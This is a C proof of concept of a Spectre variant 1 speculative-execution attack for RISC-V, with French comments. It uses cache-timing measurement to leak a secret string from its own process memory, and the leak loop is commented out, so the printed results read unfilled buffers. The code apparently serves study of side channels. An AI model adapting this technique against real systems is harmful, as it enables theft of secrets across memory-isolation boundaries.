#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#define ARRAY2_STRIDE    512
#define FLUSH_BUF_SIZE   (1024 * 1024)   // 1 MiB > L1 (et L2)

// ===========================
// GLOBALS
// ===========================
unsigned int array1_size = 16;
uint8_t unused1[64];

uint8_t array1[160] = {
    1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16
    // le reste occupe la mémoire mais n'est pas logiquement utilisé
};

uint8_t unused2[64];
uint8_t array2[256 * ARRAY2_STRIDE];

// buffer pour éviction du cache
uint8_t flush_buf[FLUSH_BUF_SIZE];

// secret stocké proche de array1
char secret_storage[64] = "Dx";
char *secret = secret_storage;

uint8_t temp = 0;

// seuil global pour distinguer "hit" / "miss"
uint64_t g_threshold = 0;

// ===========================
// TIMING
// ===========================
static inline uint64_t read_cycle(void) {
    uint64_t cycle;
    asm volatile ("rdcycle %0" : "=r"(cycle));
    return cycle;
}

__attribute__((noinline))
uint64_t measure_idx(int k) {
    volatile uint8_t *addr = &array2[k * ARRAY2_STRIDE];

    asm volatile("fence rw,rw" ::: "memory");
    uint64_t start = read_cycle();
    temp &= *addr;
    asm volatile("fence rw,rw" ::: "memory");
    uint64_t end = read_cycle();

    return end - start;
}

// ===========================
// VICTIM : GADGET SPECTRE V1
// ===========================
__attribute__((noinline))
void victim_function(size_t x) {
    if (x < array1_size) {
        uint8_t value = array1[x];
        temp &= array2[(size_t)value * ARRAY2_STRIDE];
    }
}

// ===========================
// "FLUSH" GROSSIER DU CACHE
// via flush_buf (PAS array2)
// ===========================
static inline void flush_caches_with_flushbuf(void)
{
    for (size_t j = 0; j < FLUSH_BUF_SIZE; j += 64) {
        flush_buf[j]++;   // charge plein de lignes dans le cache
    }
}

// ===========================
// CALIBRATION DU SEUIL
// ===========================
void calibrate_threshold(void) {
    int k = 5;   // index arbitraire dans array2

    // 1) flush via flush_buf
    flush_caches_with_flushbuf();

    // 2) mesure "cold"
    uint64_t cold = measure_idx(k);

    // 3) accès encore une fois = "hot"
    uint64_t hot  = measure_idx(k);

    g_threshold = (cold + hot) / 2;

    printf("=== Calibration ===\n");
    printf("cold_dt = %lu, hot_dt = %lu, threshold = %lu\n\n",
           (unsigned long)cold,
           (unsigned long)hot,
           (unsigned long)g_threshold);
}

// ===========================
// LEAK D’UN OCTET PAR SPECTRE
// ===========================
char leak_byte_spectre(size_t byte_index,
                       size_t malicious_x_base,
                       int tries,
                       int *expected_hits)
{
    int scores[256] = {0};
    const int TRAININGS = 30;

    unsigned char expected = (unsigned char)secret[byte_index];
    int hits_for_this_byte = 0;

    for (int t = 0; t < tries; t++) {

        // 1) Eviction via flush_buf (on NE TOUCHE PAS array2)
        flush_caches_with_flushbuf();

        // 2) Entraînement : x = 1 -> array1[1] = 2 -> k=2 chauffé
        for (int train = 0; train < TRAININGS; train++) {
            victim_function(1);
        }

        // 3) Attaque : x OOB -> spéculation lit array1[malicious_x]
        size_t malicious_x = malicious_x_base + byte_index;
        victim_function(malicious_x);

        // DEBUG sur le 1er octet et les 10 premiers essais
        if (t < 10 && byte_index == 0) {
            uint64_t dt_train = measure_idx(2);
            uint64_t dt_exp   = measure_idx(expected);

            // printf("[DEBUG t=%2d] dt_train(k=2)= %4lu, dt_secret(k=0x%02x '%c')= %4lu\n",
            //        t,
            //        (unsigned long)dt_train,
            //        expected,
            //        (expected >= 32 && expected < 127) ? expected : '?',
            //        (unsigned long)dt_exp);
        }

        // 4) Spécial debug: mesurer seulement l’index attendu
        {
            uint64_t dt_exp2 = measure_idx(expected);
            if (dt_exp2 < g_threshold) {
                hits_for_this_byte++;
            }
        }

        // 5) Scan : votes pour les k dont dt(k) < seuil
        for (int k = 32; k <= 126; k++) {
            if (k == 2) // ligne polluée par l’entraînement
                continue;

            uint64_t dt = measure_idx(k);
            if (dt < g_threshold) {
                scores[k]++;
            }
        }
    }

    if (expected_hits) {
        expected_hits[byte_index] = hits_for_this_byte;
    }

    // 6) Choix du meilleur candidat
    int best_k = 0;
    int best_score = -1;
    for (int k = 0; k < 256; k++) {
        if (scores[k] > best_score) {
            best_score = scores[k];
            best_k = k;
        }
    }

    // printf("Leaked byte[%zu]: 0x%02x '%c' (score=%d, expected=0x%02x '%c', expected_hits=%d)\n",
    //        byte_index,
    //        best_k,
    //        (best_k >= 32 && best_k < 127) ? best_k : '?',
    //        best_score,
    //        expected,
    //        (expected >= 32 && expected < 127) ? expected : '?',
    //        hits_for_this_byte);

    return (char)best_k;
}

// ===========================
// MAIN
// ===========================
int main(int argc, char **argv) {
    if (argc > 1) {
        strncpy(secret_storage, argv[1], sizeof(secret_storage) - 1);
        secret_storage[sizeof(secret_storage) - 1] = '\0';
    }

    size_t secret_len = strlen(secret);
    printf("Starting Spectre v1 full attack...\n");
    printf("Target secret (ground truth): %s\n", secret);

    // Init array2 & flush_buf
    for (int i = 0; i < (int)sizeof(array2); i++) {
        array2[i] = 1;
    }
    for (size_t j = 0; j < FLUSH_BUF_SIZE; j++) {
        flush_buf[j] = (uint8_t)j;
    }

    // Calcul de l’offset "malicious"
    size_t malicious_x_base =
        (size_t)((uint8_t*)secret_storage - (uint8_t*)array1);

    printf("array1_size (logical) = %u\n", array1_size);
    printf("malicious_x_base = %zu (array1[malicious_x_base] ~ secret[0])\n",
           malicious_x_base);
    printf("Direct read: array1[malicious_x_base] = 0x%02x ('%c')\n",
           array1[malicious_x_base],
           (array1[malicious_x_base] >= 32 && array1[malicious_x_base] < 127)
               ? array1[malicious_x_base]
               : '?');

    // Vérification d’aliasing : array1[malicious_x_base + i] == secret[i] ?
    printf("\n=== Alias check array1[...] vs secret[...] ===\n");
    for (size_t i = 0; i < secret_len; i++) {
        uint8_t a = array1[malicious_x_base + i];
        uint8_t s = (uint8_t)secret[i];
        // printf("i=%2zu : array1[mal_x_base+%2zu]=0x%02x '%c'  |  secret[%2zu]=0x%02x '%c'\n",
        //        i, i, a,
        //        (a >= 32 && a < 127) ? a : '?',
        //        i, s,
        //        (s >= 32 && s < 127) ? s : '?');
    }
    printf("============================================\n\n");

    // Calibration du seuil
    calibrate_threshold();

    // Boucle de fuite sur chaque caractère
    char *recovered = malloc(secret_len + 1);
    int  *expected_hits = malloc(secret_len * sizeof(int));
    if (!recovered || !expected_hits) {
        fprintf(stderr, "malloc failed\n");
        return 1;
    }
    recovered[secret_len] = '\0';

    const int TRIES = 100;  // plus de stats

    // for (size_t i = 0; i < secret_len; i++) {
    //     recovered[i] = leak_byte_spectre(i, malicious_x_base, TRIES, expected_hits);
    // }

    printf("\nRecovered secret (Spectre guess): %s\n", recovered);
    printf("Ground truth secret:              %s\n\n", secret);

    printf("Per-byte expected index hits (dt(expected) < threshold):\n");
    for (size_t i = 0; i < secret_len; i++) {
        printf("byte[%2zu] '%c' : expected_hits = %d / %d\n",
               i,
               (secret[i] >= 32 && secret[i] < 127) ? secret[i] : '?',
               expected_hits[i],
               TRIES);
    }

    printf("\ntemp = %d\n", temp);

    free(recovered);
    free(expected_hits);
    return 0;
}
